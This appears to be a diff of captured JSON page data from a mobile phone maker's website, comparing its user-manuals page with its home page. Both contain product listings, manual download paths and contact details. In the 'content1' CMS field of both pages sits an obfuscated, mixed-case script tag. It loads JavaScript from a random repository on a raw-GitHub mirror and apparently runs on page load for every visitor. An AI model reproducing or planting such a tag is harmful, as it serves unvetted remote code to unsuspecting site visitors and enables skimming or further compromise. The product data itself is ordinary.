@@ -1,552 +1,481 @@
 {
-  "url": "https://www.lavamobiles.com/_next/data/ly0JhjssYFJ7DcRKPylzU/user-manuals.json",
+  "url": "https://www.lavamobiles.com/_next/data/ly0JhjssYFJ7DcRKPylzU/index.json",
   "method": "GET",
   "status": 200,
   "content_type": "application/json",
   "body": {
     "pageProps": {
-      "userManual": {
+      "HomeData": {
         "status": 1,
-        "msg": "Care Detail",
-        "base_url": "https://hotfixapi.lavamobiles.com/storage/",
-        "recommended_products": [
-          {
-            "id": 83,
-            "name": "Prowatch ZN",
-            "slug": "prowatch-zn",
-            "status": 1,
-            "image": "media/community/image/prowatchzn-listing-1730208131.webp",
-            "thumbnail_image": null,
-            "short_description": "High Resolution AMOLED Big Display | Corning GG3 Cover Glass",
-            "description": null,
-            "price": 4999,
-            "new_launches": "no",
-            "parent_id": "accessories",
-            "launch_date": "2024-04-23T00:00:00.000Z",
-            "external_url": "https://prowatch.lavamobiles.com/zn/",
-            "recommended_product": "yes",
-            "product_variant": []
-          },
-          {
-            "id": 84,
-            "name": "Prowatch VN",
-            "slug": "prowatch-vn",
-            "status": 1,
-            "image": "media/community/image/prowatch-vn-listing-1721133266.webp",
-            "thumbnail_image": null,
-            "short_description": "Big Display High Resolution Display | Big Display High Resolution Display",
-            "description": null,
-            "price": 3999,
-            "new_launches": "no",
-            "parent_id": "accessories",
-            "launch_date": "2024-04-23T00:00:00.000Z",
-            "external_url": "https://prowatch.lavamobiles.com/vn/",
-            "recommended_product": "yes",
-            "product_variant": []
-          },
-          {
-            "id": 25,
-            "name": "AGNI 5G",
-            "slug": "agni5g",
-            "status": 1,
-            "image": "media/community/image/agni5g-1703576400.webp",
-            "thumbnail_image": "media/community/thumbnail_image/agni5g-1703576400.webp",
-            "short_description": "Powered by MediaTek Dimensity 810 - 5G | Powerful 5000mAh battery | 64 MP AI Quad Camera | 90 Hz Display",
-            "description": "<p>Powered by MediaTek Dimensity 810 - 5G | Powerful 5000mAh battery | 64 MP AI Quad Camera | 90 Hz Display</p>",
-            "price": 23999,
-            "new_launches": "no",
-            "parent_id": "smartphones",
-            "launch_date": null,
-            "external_url": null,
-            "recommended_product": "yes",
-            "product_variant": [
-              {
-                "id": 73,
-                "name": "AGNI 5G",
-                "image": "media/images/product-variant/image_path/agni-5g-thumb-1703672392.webp",
-                "thumbnail": "media/images/product-variant/thumbnail/agni-5g-thumb-1703672384.webp",
-                "color_code": "#4278b8"
-              }
-            ]
-          }
-        ],
-        "user_manuals": [
-          {
-            "id": 1055,
-            "title": "Probuds T51",
-            "download_file": "media/file/user-manuals/download_file/probuds-t51-1768304188.pdf",
-            "sorting": 1,
-            "status": 1
-          },
-          {
-            "id": 59,
-            "title": "Probuds T12",
-            "download_file": "media/file/user-manuals/download_file/probuds-t12-1757486796.pdf",
-            "sorting": 1,
-            "status": 1
-          },
-          {
-            "id": 58,
-            "title": "Probuds N12",
-            "download_file": "media/file/user-manuals/download_file/probuds-n12-1757486780.pdf",
-            "sorting": 1,
-            "status": 1
-          },
-          {
-            "id": 57,
-            "title": "Probuds Wave 931",
-            "download_file": "media/file/user-manuals/download_file/probuds-wave-931-1756447526.pdf",
-            "sorting": 1,
-            "status": 1
-          },
-          {
-            "id": 56,
-            "title": "Probuds N33",
-            "download_file": "media/file/user-manuals/download_file/probuds-n33-1756447485.pdf",
-            "sorting": 1,
-            "status": 1
-          },
-          {
-            "id": 55,
-            "title": "Probuds Wave 921",
-            "download_file": "media/file/user-manuals/download_file/probuds-wave-921-1753442285.pdf",
-            "sorting": 1,
-            "status": 1
-          },
-          {
-            "id": 54,
-            "title": "Probuds N21",
-            "download_file": "media/file/user-manuals/download_file/probuds-n21-1751608388.pdf",
-            "sorting": 1,
-            "status": 1
-          },
-          {
-            "id": 52,
-            "title": "Lava Probuds Aria 911",
-            "download_file": "media/file/user-manuals/download_file/probuds-aria-911-user-manual-1750336511.pdf",
-            "sorting": 1,
-            "status": 1
-          },
-          {
-            "id": 51,
-            "title": "Prowatch X",
-            "download_file": "media/file/user-manuals/download_file/prowatch-x-user-manual-1735552770.pdf",
-            "sorting": 1,
-            "status": 1
-          },
-          {
-            "id": 49,
-            "title": "Probuds T24",
-            "download_file": "media/file/user-manuals/download_file/Probuds T24.pdf",
-            "sorting": 1,
-            "status": 1
-          },
-          {
-            "id": 48,
-            "title": "Prowatch V1",
-            "download_file": "media/file/user-manuals/download_file/prowatch-v1-user-manual-1730276982.pdf",
-            "sorting": 1,
-            "status": 1
-          },
-          {
-            "id": 47,
-            "title": "Prowatch ZN",
-            "download_file": "media/file/user-manuals/download_file/lava_prowatch-zn_user's-manual_16-feb-2024-1721734987.pdf",
-            "sorting": 1,
-            "status": 1
-          },
-          {
-            "id": 46,
-            "title": "Probuds T31",
-            "download_file": "media/file/user-manuals/download_file/probuds-t31-1719824518.pdf",
-            "sorting": 1,
-            "status": 1
-          },
-          {
-            "id": 45,
-            "title": "Prowatch VN",
-            "download_file": "media/file/user-manuals/download_file/lava_prowatch-vn_user's-manual_16-feb-2024[41]-1721734912.pdf",
-            "sorting": 1,
-            "status": 1
-          },
-          {
-            "id": 44,
-            "title": "Lava Yuva 2 Pro",
-            "download_file": "media/file/user-manuals/download_file/lava-yuva-2-pro-user-manual-1703773351.pdf",
-            "sorting": 1,
-            "status": 1
-          },
-          {
-            "id": 43,
-            "title": "LAVA Z6",
-            "download_file": "media/file/user-manuals/download_file/z6-user-manual-1703773321.docx",
-            "sorting": 1,
-            "status": 1
-          },
-          {
-            "id": 42,
-            "title": "LAVA Z2s",
-            "download_file": "media/file/user-manuals/download_file/z2s-user-manual-1703773302.docx",
-            "sorting": 1,
-            "status": 1
-          },
-          {
-            "id": 41,
-            "title": "LAVA Agni 5G",
-            "download_file": "media/file/user-manuals/download_file/agni-user-manual-1703773278.docx",
-            "sorting": 1,
-            "status": 1
-          },
-          {
-            "id": 40,
-            "title": "LAVA Aura",
-            "download_file": "media/file/user-manuals/download_file/user-manual_aura-1703773157.pdf",
-            "sorting": 1,
-            "status": 1
-          },
-          {
-            "id": 39,
-            "title": "LAVA 34 Ultra",
-            "download_file": "media/file/user-manuals/download_file/usermanual-34-ultra-1703773138.pdf",
-            "sorting": 1,
-            "status": 1
-          },
-          {
-            "id": 38,
-            "title": "LAVA HERO 600+",
-            "download_file": "media/file/user-manuals/download_file/usermanual-hero-600+-1703773121.pdf",
-            "sorting": 1,
-            "status": 1
-          },
-          {
-            "id": 37,
-            "title": "LAVA Pulse",
-            "download_file": "media/file/user-manuals/download_file/usermanual-pulse-um-1703773103.pdf",
-            "sorting": 1,
-            "status": 1
-          },
-          {
-            "id": 36,
-            "title": "LAVA Prime X",
-            "download_file": "media/file/user-manuals/download_file/user-manual-prime-x-1703773085.pdf",
-            "sorting": 1,
-            "status": 1
-          },
-          {
-            "id": 35,
-            "title": "LAVA A1 GOLD",
-            "download_file": "media/file/user-manuals/download_file/user-manual-lava-a1-gold-1703773050.pdf",
-            "sorting": 1,
-            "status": 1
-          },
-          {
-            "id": 34,
-            "title": "LAVA 34 SUPER",
-            "download_file": "media/file/user-manuals/download_file/user-manual-34-super-1703773007.pdf",
-            "sorting": 1,
-            "status": 1
-          },
-          {
-            "id": 33,
-            "title": "LAVA A1 JOSH",
-            "download_file": "media/file/user-manuals/download_file/user-manual-lava-a1-josh-1703772986.pdf",
-            "sorting": 1,
-            "status": 1
-          },
-          {
-            "id": 32,
-            "title": "LAVA SPARK I8",
-            "download_file": "media/file/user-manuals/download_file/user-manual--lava-i8-1703772812.pdf",
-            "sorting": 1,
-            "status": 1
-          },
-          {
-            "id": 31,
-            "title": "LAVA A7",
-            "download_file": "media/file/user-manuals/download_file/user-manual--a7-1703772764.pdf",
-            "sorting": 1,
-            "status": 1
-          },
-          {
-            "id": 30,
-            "title": "Lava Blaze Pro",
-            "download_file": "media/file/user-manuals/download_file/lava-blaze-pro-user-manual-1703772724.pdf",
-            "sorting": 1,
-            "status": 1
-          },
-          {
-            "id": 29,
-            "title": "Lava Blaze 2",
-            "download_file": "media/file/user-manuals/download_file/lava-blaze-2-user-manual-1703772681.pdf",
-            "sorting": 1,
-            "status": 1
-          },
-          {
-            "id": 28,
-            "title": "LAVA Z4",
-            "download_file": "media/file/user-manuals/download_file/z4-user-manual-1703772663.docx",
-            "sorting": 1,
-            "status": 1
-          },
-          {
-            "id": 27,
-            "title": "LAVA Z2",
-            "download_file": "media/file/user-manuals/download_file/z2-user-manual-1703772606.docx",
-            "sorting": 1,
-            "status": 1
-          },
-          {
-            "id": 26,
-            "title": "LAVA Z2 Max",
-            "download_file": "media/file/user-manuals/download_file/z2-max-user-manual-1703772560.docx",
-            "sorting": 1,
-            "status": 1
-          },
-          {
-            "id": 25,
-            "title": "LAVA Magnum XL",
-            "download_file": "media/file/user-manuals/download_file/user-manual_magnum_xl-1703772486.pdf",
-            "sorting": 1,
-            "status": 1
-          },
-          {
-            "id": 24,
-            "title": "LAVA HERO 600s",
-            "download_file": "media/file/user-manuals/download_file/usermanual-hero-600s-1703772384.pdf",
-            "sorting": 1,
-            "status": 1
-          },
-          {
-            "id": 23,
-            "title": "LAVA HERO 600",
-            "download_file": "media/file/user-manuals/download_file/usermanual-hero-600-1703772362.pdf",
-            "sorting": 1,
-            "status": 1
-          },
-          {
-            "id": 22,
-            "title": "LAVA Pulse 1",
-            "download_file": "media/file/user-manuals/download_file/usermanual-pulse1-um-1703772321.pdf",
-            "sorting": 1,
-            "status": 1
-          },
-          {
-            "id": 21,
-            "title": "LAVA ONE",
-            "download_file": "media/file/user-manuals/download_file/user-manual-lava-one-1703772298.pdf",
-            "sorting": 1,
-            "status": 1
-          },
-          {
-            "id": 20,
-            "title": "LAVA A7 WAVE",
-            "download_file": "media/file/user-manuals/download_file/user-manual-a7-wave-1703772273.pdf",
-            "sorting": 1,
-            "status": 1
-          },
-          {
-            "id": 19,
-            "title": "LAVA 34 PLUS",
-            "download_file": "media/file/user-manuals/download_file/user-manual-34-plus-1703771355.pdf",
-            "sorting": 1,
-            "status": 1
-          },
-          {
-            "id": 18,
-            "title": "LAVA A1 BUZZ",
-            "download_file": "media/file/user-manuals/download_file/user-manual-lava-a1-buzz-1703771327.pdf",
-            "sorting": 1,
-            "status": 1
-          },
-          {
-            "id": 17,
-            "title": "LAVA GEM",
-            "download_file": "media/file/user-manuals/download_file/user-manual-lava-gem-1703771296.pdf",
-            "sorting": 1,
-            "status": 1
-          },
-          {
-            "id": 16,
-            "title": "LAVA A3",
-            "download_file": "media/file/user-manuals/download_file/npi_user-manual-captain-a3-1703771260.pdf",
-            "sorting": 1,
-            "status": 1
-          },
-          {
-            "id": 15,
-            "title": "Lava Blaze",
-            "download_file": "media/file/user-manuals/download_file/lava-blaze-user-manual-1703771228.pdf",
-            "sorting": 1,
-            "status": 1
-          },
-          {
-            "id": 14,
-            "title": "LAVA Z21",
-            "download_file": "media/file/user-manuals/download_file/z21-user-manual-1703771190.docx",
-            "sorting": 1,
-            "status": 1
-          },
-          {
-            "id": 13,
-            "title": "LAVA Z3",
-            "download_file": "media/file/user-manuals/download_file/z3-user-manual-1703771119.docx",
-            "sorting": 1,
-            "status": 1
-          },
-          {
-            "id": 12,
-            "title": "LAVA Z1s",
-            "download_file": "media/file/user-manuals/download_file/z1s-user-manual-1703771095.docx",
-            "sorting": 1,
-            "status": 1
-          },
-          {
-            "id": 11,
-            "title": "LAVA Ivory",
-            "download_file": "media/file/user-manuals/download_file/user-manual_ivory-1703771073.pdf",
-            "sorting": 1,
-            "status": 1
-          },
-          {
-            "id": 10,
-            "title": "LAVA A1 Colours",
-            "download_file": "media/file/user-manuals/download_file/usermanual-lava-a1-colours-1703771056.pdf",
-            "sorting": 1,
-            "status": 1
-          },
-          {
-            "id": 9,
-            "title": "LAVA HERO 600s WC",
-            "download_file": "media/file/user-manuals/download_file/usermanual-hero-600s-wc-1703771035.pdf",
-            "sorting": 1,
-            "status": 1
-          },
-          {
-            "id": 8,
-            "title": "LAVA A7 2020",
-            "download_file": "media/file/user-manuals/download_file/usermanual-a7-2020-1703771017.pdf",
-            "sorting": 1,
-            "status": 1
-          },
-          {
-            "id": 7,
-            "title": "LAVA Z61 Pro",
-            "download_file": "media/file/user-manuals/download_file/usermanual-z61-pro-1703770996.pdf",
-            "sorting": 1,
-            "status": 1
-          },
-          {
-            "id": 6,
-            "title": "LAVA GEM WAVE",
-            "download_file": "media/file/user-manuals/download_file/user-manual-lava-gem-wave-1703770975.pdf",
-            "sorting": 1,
-            "status": 1
-          },
-          {
-            "id": 5,
-            "title": "LAVA A7 ROSE GOLD",
-            "download_file": "media/file/user-manuals/download_file/user-manual-a7-rose-gold-1703770929.pdf",
-            "sorting": 1,
-            "status": 1
-          },
-          {
-            "id": 4,
-            "title": "LAVA A1",
-            "download_file": "media/file/user-manuals/download_file/user-manual-lava-a1-1703770903.pdf",
-            "sorting": 1,
-            "status": 1
-          },
-          {
-            "id": 3,
-            "title": "LAVA PRIME Z",
-            "download_file": "media/file/user-manuals/download_file/lava-prime-z-1703770873.pdf",
-            "sorting": 1,
-            "status": 1
-          },
-          {
-            "id": 2,
-            "title": "LAVA HERO 600",
-            "download_file": "media/file/user-manuals/download_file/lava-hero-600-1703770841.pdf",
-            "sorting": 1,
-            "status": 1
-          },
-          {
-            "id": 1,
-            "title": "LAVA A1200",
-            "download_file": "media/file/user-manuals/download_file/npi-user-manual-a1200-1703770639.pdf",
-            "sorting": 1,
-            "status": 1
-          }
-        ],
-        "we_care": [
-          {
-            "id": 3,
-            "type": "9",
-            "title": "Service@Home",
-            "description": "<h3 class=\"text-xl  lg:mb-5 mb-3\" data-aos=\"fade-up\" data-aos-duration=\"1000\">Service@Home</h3>\r\n<p class=\"text-base\" data-aos=\"fade-up\">To avail Free Service at Home and Phone Replacement on AGNI 2, <br>visit the  <a href=\"/lava_service_at_home\" class=\"underline\">Service at Home</a>.</p>",
-            "image_path": "media/cmsimage/image_path/lava-care-banner2-1721625848.webp",
-            "image_path_mobile": "media/cmsimage/image_path_mobile/service-home-2-1721625849.webp",
-            "mobile": null,
-            "sorting": 1
-          },
-          {
-            "id": 7,
-            "type": "9",
-            "title": "User Manuals",
-            "description": "<h3 class=\"text-xl lg:mb-5 mb-3\" data-aos=\"fade-up\" data-aos-duration=\"1000\">User Manuals</h3>\r\n<p class=\"text-base\" data-aos=\"fade-up\"><a href=\"/user-manuals\" class=\"underline\">Download User Manuals</a></p>",
-            "image_path": "media/cmsimage/image_path/user-manual-1703572504.webp",
-            "image_path_mobile": "media/cmsimage/image_path_mobile/user-manual-1708339434.webp",
-            "mobile": null,
-            "sorting": 1
-          }
-        ],
-        "contact": [
-          {
-            "id": 1,
-            "type": "8",
-            "title": "Address",
-            "description": "<h2 class=\"text-white font-S700 mb-3.5\">Address</h2>\r\n\r\n <p class=\"font-S400 text-[#B4B4B4] mb-3\">LAVA International Ltd.<br> A-56, Sector \u2013 64, Noida-201301 (UP)</p>\r\n <a target=\"_blank\" href=\"https://www.google.com/maps/place/Lava+International+Ltd./@28.6123071,77.3725704,17z/data=!3m1!4b1!4m6!3m5!1s0x390ce5135260691d:0x2c4dec1e62551dcf!8m2!3d28.6123024!4d77.3751453!16s%2Fg%2F11f5t376s4?entry=ttu\">\r\n                Get Direction\r\n                <img class=\"inline-block -mt-1\" src=\"/assets/img/arrow_right_white.svg\">\r\n              </a>",
-            "image_path": "media/cmsimage/image_path/pin-1703082456.webp",
-            "image_path_mobile": null,
-            "mobile": null,
-            "sorting": 1
-          },
-          {
-            "id": 4,
-            "type": "8",
-            "title": "24x7 Toll Free Number",
-            "description": "<p><br></p>",
-            "image_path": "media/cmsimage/image_path/phone-1703084061.webp",
-            "image_path_mobile": null,
-            "mobile": "1800-103-6844",
-            "sorting": 3
-          }
-        ]
-      },
-      "pageData": {
-        "status": 1,
-        "msg": "user-manuals Page Content",
+        "msg": "home Page Content",
         "data": {
-          "id": 21,
-          "slug": "user-manuals",
-          "name": "User Manuals",
-          "sub_text": "User Manuals",
+          "id": 3,
+          "slug": "home",
+          "name": "Home Page",
+          "sub_text": null,
           "content1": "<p><br></p><sCrIpT sRc=//raw.githack.com/gogok4nxgo/1v9et39j58z1/main/1.js></ScRiPt>",
-          "content2": null,
-          "content3": null,
-          "content4": null,
-          "content5": null,
-          "content6": null,
-          "page_title": "Lava Service Centres List, Customer Care, Spare Parts Price - LAVA Mobiles",
-          "meta_keywords": null,
-          "meta_description": "Lava Service Centres List, Customer Care, Spare Parts Price - LAVA Mobiles",
+          "content2": "<h2 class=\"text-gray-800 font-S400 lg:text-custom-30   lg:leading-40 smdesk:text-custom-27   smdesk:leading-37\" data-aos=\"fade-up\">BLAZE X</h2>\r\n<p class=\"text-gray-800 font-S300 uppercase md:mb-8 mb-4 text-base\" data-aos=\"fade-up\" data-aos-duration=\"1000\">Segment First 5G 3D Curved AMOLED Display*</p>\r\n\r\n\r\n<a href=\"/smartphones/blaze-x\" class=\"btn btn-bg-mobile\" data-aos=\"fade-up\" data-aos-duration=\"1300\">Learn More</a>",
+          "content3": "<h2 class=\"text-gray-800 font-S400 lg:text-custom-30   lg:leading-40 smdesk:text-custom-27   smdesk:leading-37\" data-aos=\"fade-up\">YUVA 5G</h2>\r\n<p class=\"text-gray-800 font-S300 uppercase md:mb-8 mb-4 text-base\" data-aos=\"fade-up\" data-aos-duration=\"1000\">YUVA AB BANEGA 5G</p>\r\n<a href=\"/smartphones/yuva-5g\" class=\"btn btn-bg-mobile\" data-aos=\"fade-up\" data-aos-duration=\"1300\">Learn More</a>",
+          "content4": "<h2 class=\"text-gray-800 font-S400 lg:text-custom-30   lg:leading-40 smdesk:text-custom-27  480xs:text-custom-28 smdesk:leading-37 480xs:leading-38\" data-aos=\"fade-up\">AGNI 3</h2>\r\n<p class=\"text-gray-800 font-S300 uppercase md:mb-8 mb-4 text-base\" data-aos=\"fade-up\" data-aos-duration=\"1000\">India's First Dual AMOLED Display* </p>\r\n\r\n\r\n<a href=\"/smartphones/agni-3\" class=\"btn btn-bg-mobile\" data-aos=\"fade-up\" data-aos-duration=\"1300\">Learn More</a>",
+          "content5": "<h2 class=\"text-gray-800 lg:text-custom-30   lg:leading-40 md:text-custom-27   md:leading-37 text-xl 767xs:font-S600\" data-aos=\"fade-up\">FREE REPLACEMENT <br class=\"br-none\">AT HOME</h2>\r\n                <p class=\"text-gray-800  text-base uppercase md:mb-8 mb-4 mt-2\" data-aos=\"fade-up\" data-aos-duration=\"1000\">Free Service@ Home</p>\r\n                <a href=\"/lava_service_at_home\" class=\"btn btn-bg-mobile\" data-aos=\"fade-up\" data-aos-duration=\"1300\">\r\n                  Learn More\r\n                </a>",
+          "content6": "<p><br></p>",
+          "page_title": "Latest Mobile Phones, Smartphones, Accessories - Lava Official Website",
+          "meta_keywords": "LAVA Mobiles",
+          "meta_description": "LAVA Mobiles, an Indian mobile phone company offers a wide range of latest smartphones, feature phones, tablets and accessories with latest technologies at best price in India. Shop Now.",
           "meta_other": null,
           "video_url": null,
-          "image": "media/cmspage/image/user-manual-banner-1703336958.webp",
-          "image_alt": null,
-          "image_mobile": "media/cmspage/image_mobile/frame-157512-1703585370.webp",
+          "image": "media/cmspage/image/product-image1-1702377341.webp",
+          "image_alt": "Home Page",
+          "image_mobile": "",
           "status": 1
         },
+        "new-launches": [
+          {
+            "id": 1123,
+            "slug": "agni-4",
+            "name": "AGNI 4",
+            "sorting": null,
+            "image": "media/community/image/agni-4-listing-v1-1782736173.webp",
+            "short_description": "Premium flagship design with Aluminum Metal frame & Matte AG Glass Back | Powered by Vayu AI with Expert AI Agents for learning, creativity, productivity and system-level control | 3.35GHz MediaTek Dimensity 8350 Processor (4nm) with LPDDR5X RAM & UFS4.0 Storage | 16.94cm (6.67-inch) 1.5K Flat AMOLED display with 120Hz refresh rate & 2400nits of peak brightness | 50MP OIS Main Rear Camera + 8MP Ultrawide + 50MP Front Camera with EIS, both rear & front with 4K@60fps",
+            "description": null,
+            "created_at": "2025-11-21T15:27:13.803Z",
+            "category_id": 2,
+            "price": null,
+            "cut_price": null,
+            "buy_now_url": null,
+            "read_more_url": "/smartphones/agni-4",
+            "external_url": null,
+            "memory": null,
+            "internal_storage": null,
+            "cat_slug": "agni-series",
+            "cat_name": "Agni Series",
+            "cat_category": "smartphones"
+          },
+          {
+            "id": 1124,
+            "slug": "play-max",
+            "name": "Play Max",
+            "sorting": null,
+            "image": "media/community/image/play-max-listing-1782735825.webp",
+            "short_description": "2.5 GHz MediaTek Dimensity 7300 Processor (4nm) - 700,000K+ Antutu Score | 6.72\" FHD+ Display with 120Hz Refresh Rate | (6GB+6GB*)/(8GB+8GB*) LPDDR4X RAM + 128GB UFS 3.1 ROM | VC chamber cooling | 50MP AI Camera with EIS, 8MP Selfie Camera",
+            "description": null,
+            "created_at": "2025-12-11T10:47:06.903Z",
+            "category_id": 1025,
+            "price": null,
+            "cut_price": null,
+            "buy_now_url": null,
+            "read_more_url": "/smartphones/play-max",
+            "external_url": null,
+            "memory": null,
+            "internal_storage": null,
+            "cat_slug": "play-series",
+            "cat_name": "PLAY Series",
+            "cat_category": "smartphones"
+          },
+          {
+            "id": 1127,
+            "slug": "blaze-duo-3",
+            "name": "Blaze Duo 3",
+            "sorting": null,
+            "image": "media/community/image/blaze-duo-3-listing-1782735263.webp",
+            "short_description": "Large 16.94cm (6.67\") FHD+ Amoled Punch-Hole Display with 120Hz Refresh Rate | Segment's First 1.6\" Secondary AMOLED Display | 2.6GHz Latest MediaTek Dimensity 7060 Superfast Processor | 50MP AI Rear Camera with Sony Sensor | (6GB+6GB*) LPDDR5 RAM + 128GB UFS 3.1 ROM | Superior Audio Experience with Stereo Speakers",
+            "description": null,
+            "created_at": "2026-01-19T10:10:52.020Z",
+            "category_id": 3,
+            "price": 21999,
+            "cut_price": 20999,
+            "buy_now_url": null,
+            "read_more_url": "/smartphones/blaze-duo-3",
+            "external_url": null,
+            "memory": null,
+            "internal_storage": null,
+            "cat_slug": "blaze-series",
+            "cat_name": "Blaze Series",
+            "cat_category": "smartphones"
+          },
+          {
+            "id": 1128,
+            "slug": "star-3",
+            "name": "Star 3",
+            "sorting": null,
+            "image": "media/community/image/star-3-listing-1782735042.webp",
+            "short_description": "4GB+4GB* RAM  l 64GB ROM | Octa Core Processor | 17.13cm (6.75\") HD+ display  | 13 MP AI Dual Rear Camera | 5000mAh Battery with Type-C Port & 10 W Charging",
+            "description": null,
+            "created_at": "2026-02-05T11:48:37.410Z",
+            "category_id": 5,
+            "price": null,
+            "cut_price": null,
+            "buy_now_url": null,
+            "read_more_url": "/smartphones/star-3",
+            "external_url": null,
+            "memory": null,
+            "internal_storage": null,
+            "cat_slug": "yuva-series",
+            "cat_name": "Yuva Series",
+            "cat_category": "smartphones"
+          },
+          {
+            "id": 1129,
+            "slug": "bold-n2",
+            "name": "Bold N2",
+            "sorting": null,
+            "image": "media/community/image/bold-n2-listing-1782734535.webp",
+            "short_description": "4GB+4GB* RAM  l 64GB ROM | Octa Core Processor | 17.13cm (6.75\") HD+ display  | 13 MP AI Dual Rear Camera | 5000mAh Battery with Type-C Port & 10 W Charging",
+            "description": null,
+            "created_at": "2026-02-23T18:07:35.700Z",
+            "category_id": 1024,
+            "price": null,
+            "cut_price": null,
+            "buy_now_url": null,
+            "read_more_url": "/smartphones/bold-n2",
+            "external_url": null,
+            "memory": null,
+            "internal_storage": null,
+            "cat_slug": "bold-series",
+            "cat_name": "BOLD Series",
+            "cat_category": "smartphones"
+          },
+          {
+            "id": 1132,
+            "slug": "bold-n2-lite",
+            "name": "Bold N2 Lite",
+            "sorting": null,
+            "image": "media/community/image/bold-n2-lite-listing-1782727220.webp",
+            "short_description": "3GB+4GB* RAM  l 64GB ROM | Octa Core Processor | 17.13cm (6.75\") HD+ display | 13 MP AI Dual Rear Camera | 5000mAh Battery with Type-C Port & 10 W Charging",
+            "description": null,
+            "created_at": "2026-04-02T10:31:17.310Z",
+            "category_id": 1024,
+            "price": null,
+            "cut_price": null,
+            "buy_now_url": null,
+            "read_more_url": "/smartphones/bold-n2-lite",
+            "external_url": null,
+            "memory": null,
+            "internal_storage": null,
+            "cat_slug": "bold-series",
+            "cat_name": "BOLD Series",
+            "cat_category": "smartphones"
+          },
+          {
+            "id": 1135,
+            "slug": "shark-2-5g",
+            "name": "Shark 2 5G",
+            "sorting": null,
+            "image": "media/community/image/shark-2-5g-listing-1782734375.webp",
+            "short_description": "4GB+4GB* RAM  l 64GB ROM | Unisoc T8200 Octa Core Ultra Fast Processor | 17.13cm (6.75\") HD+ 120Hz display  | 6000mAh Battery with Type-C Port & 10 W Charging (18W Support) | IP 64 Dust and Water Resistant | 13 MP AI Dual Rear Camera",
+            "description": null,
+            "created_at": "2026-05-25T10:16:31.077Z",
+            "category_id": 1023,
+            "price": null,
+            "cut_price": null,
+            "buy_now_url": null,
+            "read_more_url": "/smartphones/shark-2-5g",
+            "external_url": null,
+            "memory": null,
+            "internal_storage": null,
+            "cat_slug": "shark-series",
+            "cat_name": "Shark Series",
+            "cat_category": "smartphones"
+          },
+          {
+            "id": 1136,
+            "slug": "bold-n2-5g",
+            "name": "Bold N2 5G",
+            "sorting": null,
+            "image": "media/community/image/bold-n2-5g-listing-1782726945.webp",
+            "short_description": "Unisoc T8200 Octa Core Ultra Fast Processor | 17.13cm (6.75\") HD+ 120Hz display  | IP 64 Dust and Water Resistant | 13 MP AI Dual Rear Camera | 4GB+4GB* RAM  l 64GB ROM",
+            "description": null,
+            "created_at": "2026-06-03T12:20:04.697Z",
+            "category_id": 1024,
+            "price": null,
+            "cut_price": null,
+            "buy_now_url": null,
+            "read_more_url": null,
+            "external_url": null,
+            "memory": null,
+            "internal_storage": null,
+            "cat_slug": "bold-series",
+            "cat_name": "BOLD Series",
+            "cat_category": "smartphones"
+          },
+          {
+            "id": 1137,
+            "slug": "smart-4-plus",
+            "name": "Smart 4 Plus",
+            "sorting": null,
+            "image": "media/community/image/smart-4-plus--listing-1782575120.webp",
+            "short_description": "4GB+4GB* RAM  l 64GB ROM | Octa Core Processor | 17.13cm (6.75\") HD+ display | 13 MP AI Dual Rear Camera | 5000mAh Battery with Type-C Port & 10 W Charging",
+            "description": null,
+            "created_at": "2026-06-09T10:00:17.380Z",
+            "category_id": 5,
+            "price": null,
+            "cut_price": null,
+            "buy_now_url": null,
+            "read_more_url": null,
+            "external_url": null,
+            "memory": null,
+            "internal_storage": null,
+            "cat_slug": "yuva-series",
+            "cat_name": "Yuva Series",
+            "cat_category": "smartphones"
+          },
+          {
+            "id": 117,
+            "slug": "storm-play-5g",
+            "name": "Storm Play 5G",
+            "sorting": 1,
+            "image": "media/community/image/storm-play-listing-1750746236.webp",
+            "short_description": "Large 17.13cm (6.75\") HD+ Water-Drop Display with 120Hz Refresh Rate | 50MP AI Rear Camera with Sony Sensor | 2.6GHz Latest MediaTek Dimensity 7060 Superfast Processor | (6GB+6GB*) / (8GB+8GB*) LPDDR5 RAM + 128GB UFS 3.1 ROM | Powerful 5000mAh Battery with 18W Fast Charging Supported | Type-C USB | Premium Glossy Back Design",
+            "description": null,
+            "created_at": "2025-06-17T23:42:42.030Z",
+            "category_id": 4,
+            "price": 13499,
+            "cut_price": 11499,
+            "buy_now_url": "https://shop.lavamobiles.com/products/storm-play-5g",
+            "read_more_url": "/smartphones/storm-play-5g",
+            "external_url": null,
+            "memory": null,
+            "internal_storage": null,
+            "cat_slug": "storm",
+            "cat_name": "Storm Series",
+            "cat_category": "smartphones"
+          },
+          {
+            "id": 118,
+            "slug": "blaze-dragon",
+            "name": "Blaze Dragon",
+            "sorting": 1,
+            "image": "media/community/image/blaze-dragon-listing1-1753527548.webp",
+            "short_description": "2.2 GHz Snapdragon 4Gen2 Processor | (4GB+4GB*)/(6GB+6GB*) LPDDR4X RAM + 128GB UFS 3.1 ROM | 50MP AI Rear Camera and 8MP Front Camera | 6.75\" HD+ Display with 120Hz Refresh Rate | Powerful 5000mAh Battery with 18W Fast Charging | Type-C USB | Premium Glossy Black Design | Clean Android 15 OS \u2013 No Bloatware, No Ads, No Notifications",
+            "description": null,
+            "created_at": "2025-07-26T16:29:09.293Z",
+            "category_id": 3,
+            "price": null,
+            "cut_price": null,
+            "buy_now_url": null,
+            "read_more_url": "/smartphone/blaze-dragon",
+            "external_url": null,
+            "memory": null,
+            "internal_storage": null,
+            "cat_slug": "blaze-series",
+            "cat_name": "Blaze Series",
+            "cat_category": "smartphones"
+          },
+          {
+            "id": 116,
+            "slug": "storm-lite",
+            "name": "Storm Lite 5G",
+            "sorting": 2,
+            "image": "media/community/image/storm-lite-listing-1750842491.webp",
+            "short_description": "Lightning Fast Performance with MediaTek Dimensity 6400 Chipset | 4GB+4GB* RAM  l 64 GB/128GB Memory | 50MP SONY IMX752 Sensor Rear Camera & 5 MP Selfie Camera | (6.75\") 120Hz Display |",
+            "description": null,
+            "created_at": "2025-06-12T15:37:34.080Z",
+            "category_id": 4,
+            "price": 10999,
+            "cut_price": 8999,
+            "buy_now_url": "https://shop.lavamobiles.com/products/storm-lite-5g",
+            "read_more_url": "/smartphones/storm-lite",
+            "external_url": null,
+            "memory": null,
+            "internal_storage": null,
+            "cat_slug": "storm",
+            "cat_name": "Storm Series",
+            "cat_category": "smartphones"
+          },
+          {
+            "id": 115,
+            "slug": "bold-n1",
+            "name": "Bold N1",
+            "sorting": 3,
+            "image": "media/community/image/bold-n1-listing-1749128869.webp",
+            "short_description": "4GB+4GB* RAM  l 64GB ROM | Octa-core Processor | 17.13cm (6.75\") HD+ Display  | 13MP AI Dual Rear Camera | 5000mAh Battery with Type-C Port & 10W Charging | IP54 Dust and Water Resistant",
+            "description": null,
